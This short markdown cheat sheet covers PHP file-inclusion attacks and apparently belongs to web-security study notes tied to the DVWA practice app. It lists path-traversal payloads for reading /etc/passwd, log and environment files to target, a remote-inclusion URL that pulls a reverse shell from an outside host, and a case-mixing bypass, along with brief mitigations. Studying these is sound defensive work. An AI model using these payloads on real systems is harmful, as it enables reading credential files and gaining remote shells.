# File Inclusion

## Local
- Exploit
  - Modify ```?page=include.php``` to ```?page=../../../../../etc/passwd```

- Intersting files
  - ```/proc/self/environ```
  - ```/var/log/auth.log```
  - ```/var/log/apache2/access.log```
  
- Mitigation
  - Use static file inclusion. hard code the fiels that we want to include in the code.

## Remote
- Exploit
  - ```http://127.0.0.1/vulnerabilities/fi/?page=http://192.168.72.200:9999/php-reverse-shell.php```

- Bypass
  - ```?page=hTTp://10.20.14.203/reverse.txt?```

- Mitigation
  -  Disable ```allow_url_fopen = On``` & ```allow_url_include = On```

## Example
  - [DVWA](../BuggyApp/DVWA/file-inclusion.md)  
